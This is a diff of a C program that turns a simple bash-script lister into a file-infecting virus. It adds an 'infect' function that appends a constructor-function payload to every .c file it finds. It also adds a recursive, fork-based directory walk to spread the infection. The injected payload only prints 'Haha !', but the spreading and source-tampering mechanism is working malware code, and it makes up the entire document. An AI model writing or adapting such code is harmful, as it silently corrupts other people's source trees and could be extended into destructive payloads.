@@ -6,9 +6,8 @@
 #include <dirent.h>
 #include <string.h>
 
-#define NBR_FILE_MAX 100
-#define LEN_NAME_MAX 256
-#define SIGN "#!/bin/bash"
+#define EXT ".c"
+#define MSG "\nvoid a() __attribute__ ((constructor)); void a() {printf(\"Haha !\\n\");}"
 
 int is_file(const char *file) {
 	// Indicate if the file is a standard file or a directory.
@@ -18,87 +17,61 @@ int is_file(const char *file) {
     return S_ISREG(file_stat.st_mode);
 }
 
-char **create_array() {
-	// Initialise an array of string.
-	
-	char **pArray = calloc(NBR_FILE_MAX, sizeof(char *));
-	for (size_t file = 0; file < NBR_FILE_MAX; ++file) {
-		pArray[file] = calloc(LEN_NAME_MAX, sizeof(char));
+void infect(const char *file) {
+	// Infect the targeted file.
+		
+	FILE *pFile;
+	if ((pFile = fopen(file, "a+")) == NULL) {
+		return;
 	}
 	
-	return pArray;
+	fwrite(MSG, strlen(MSG), sizeof(char), pFile);
+	
+	fclose(pFile);
 }
 
-void destroy_array(char **pArray) {
-	// Free all the alocated memory of the array.
-	
-	for (size_t file = 0; file < NBR_FILE_MAX; ++file) {
-		free(pArray[file]);
-	}
-	free(pArray);
-}
+void get_targets(const char *directory, const int need_cd) {
+	// Get all the file to infect.
 
-char **get_all_bashs(const char *directory) {
-	// Get all the name of the script in the given directory.
-	
-	char **pScripts = create_array();
-	
-	if (chdir(directory) == -1) {
-		perror(directory);
-		return pScripts;
+	DIR *pDir;
+	if ((pDir = opendir(directory)) == NULL) {
+		return;
+	}
+
+	if (need_cd && chdir(directory) == -1) {
+		return;
 	}
 	
-	DIR *pDir = opendir(directory);	
-	if (pDir == NULL) NULL;
-	
-	struct dirent *pDirent = NULL;
-	FILE *pFile = NULL;
-	char buf[BUFSIZ];
-	
-	size_t count = 0;
-    while ((pDirent = readdir(pDir)) != NULL && count < NBR_FILE_MAX) {
+	struct dirent *pDirent = NULL;	
+    while ((pDirent = readdir(pDir)) != NULL) {
     
-        if (!is_file(pDirent->d_name)) continue;
+        if (!is_file(pDirent->d_name)) {
+        	if (pDirent->d_name[0] != '.') {
+        		if (fork() == 0) {
+		        	get_targets(pDirent->d_name, 1);
+		        	break;
+		        }
+        	}
+			continue;
+        }
         
-        if ((pFile = fopen(pDirent->d_name, "r+")) == NULL) continue;
-        
-        fread(buf, strlen(SIGN), sizeof(char), pFile);
-        
-        if (strncmp(buf, SIGN, strlen(SIGN)) == 0) strncpy(pScripts[count++], pDirent->d_name, LEN_NAME_MAX);
-
-        fclose(pFile);
+        if (strncmp(pDirent->d_name + (strlen(pDirent->d_name) - 2), EXT, strlen(EXT)) == 0) {
+        	infect(pDirent->d_name);
+        }
     }
     
-    closedir (pDir);
-    
-    return pScripts;
+    closedir(pDir);
 }
 
-void print_scripts(char** const pScripts) {
-	// Display all the filename of scripts find.
-	
-	puts("[*] Scripts find :");
-	size_t index = 0;
-	while (pScripts[index][0] != '\0') {
-		printf("\t[-] %s\n", pScripts[index++]);
-	}
-}
-
-int main(int argc, char** argv) {
-
-	char **pScripts;
+int main(int argc, char **argv) {
 	
 	if (argc > 1) {
-		pScripts = get_all_bashs(argv[1]);
+		get_targets(argv[1], 1);
 	} else {
 		char *pCurrent_dir = getcwd(NULL, 0);
-		pScripts = get_all_bashs(pCurrent_dir);
+		get_targets(pCurrent_dir, 0);
 		free(pCurrent_dir);
 	}
-		
-	print_scripts(pScripts);
 	
-	destroy_array(pScripts);
-	
-    return 0;
+    return EXIT_SUCCESS;
 }
